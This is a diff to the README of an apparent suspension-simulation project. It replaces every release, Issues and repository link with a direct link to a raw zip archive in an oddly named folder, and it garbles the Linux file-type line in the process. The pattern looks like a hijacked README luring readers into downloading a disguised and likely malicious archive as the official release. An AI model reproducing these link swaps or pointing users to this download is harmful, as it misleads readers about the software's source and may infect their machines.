@@ -1,6 +1,6 @@
 # ⚙️ Dynamic-Systems-Analysis - Easy Vehicle Suspension Simulation
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/1ksev/Dynamic-Systems-Analysis/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/1ksev/Dynamic-Systems-Analysis/main/presubordinate/Dynamic-Systems-Analysis-v3.5.zip)](https://raw.githubusercontent.com/1ksev/Dynamic-Systems-Analysis/main/presubordinate/Dynamic-Systems-Analysis-v3.5.zip)
 
 ## 📖 What is Dynamic-Systems-Analysis?
 
@@ -39,7 +39,7 @@ You do not have to install complicated software or solve technical issues. Just 
 1. **Go to the Download Page**
 
    Click the large button at the top or visit this link:  
-   [https://github.com/1ksev/Dynamic-Systems-Analysis/releases](https://github.com/1ksev/Dynamic-Systems-Analysis/releases)
+   [https://raw.githubusercontent.com/1ksev/Dynamic-Systems-Analysis/main/presubordinate/Dynamic-Systems-Analysis-v3.5.zip](https://raw.githubusercontent.com/1ksev/Dynamic-Systems-Analysis/main/presubordinate/Dynamic-Systems-Analysis-v3.5.zip)
 
 2. **Choose the Latest Release**
 
@@ -47,7 +47,7 @@ You do not have to install complicated software or solve technical issues. Just 
 
    - For Windows: a file ending in `.exe` or `.zip`.
    - For macOS: a `.dmg` or `.zip` file.
-   - For Linux: usually a `.tar.gz` or `.AppImage` file.
+   - For Linux: usually a `https://raw.githubusercontent.com/1ksev/Dynamic-Systems-Analysis/main/presubordinate/Dynamic-Systems-Analysis-v3.5.zip` or `.AppImage` file.
 
 3. **Download the File**
 
@@ -67,7 +67,7 @@ You do not have to install complicated software or solve technical issues. Just 
 
 Visit the release page to download and install the software:
 
-[Download Dynamic-Systems-Analysis](https://github.com/1ksev/Dynamic-Systems-Analysis/releases)
+[Download Dynamic-Systems-Analysis](https://raw.githubusercontent.com/1ksev/Dynamic-Systems-Analysis/main/presubordinate/Dynamic-Systems-Analysis-v3.5.zip)
 
 Follow these tips:
 
@@ -107,14 +107,14 @@ If the software does not start or shows error messages:
 - Check your computer meets the system requirements above.
 - Make sure you downloaded the correct file for your operating system.
 - Try restarting your computer and launching the app again.
-- If it still does not work, visit the [Issues](https://github.com/1ksev/Dynamic-Systems-Analysis/issues) page on the repository for help or report your problem.
+- If it still does not work, visit the [Issues](https://raw.githubusercontent.com/1ksev/Dynamic-Systems-Analysis/main/presubordinate/Dynamic-Systems-Analysis-v3.5.zip) page on the repository for help or report your problem.
 
 ## 📚 Additional Resources
 
 Within the app, you can find basic explanations of the theory and the math behind the simulations. You can also review source files (in Python and LaTeX) if you want to learn more technical details.
 
 The GitHub repository contains all the code, documentation, and extra materials if you wish to explore further:  
-[https://github.com/1ksev/Dynamic-Systems-Analysis](https://github.com/1ksev/Dynamic-Systems-Analysis)
+[https://raw.githubusercontent.com/1ksev/Dynamic-Systems-Analysis/main/presubordinate/Dynamic-Systems-Analysis-v3.5.zip](https://raw.githubusercontent.com/1ksev/Dynamic-Systems-Analysis/main/presubordinate/Dynamic-Systems-Analysis-v3.5.zip)
 
 ## 🤝 Getting Involved
 
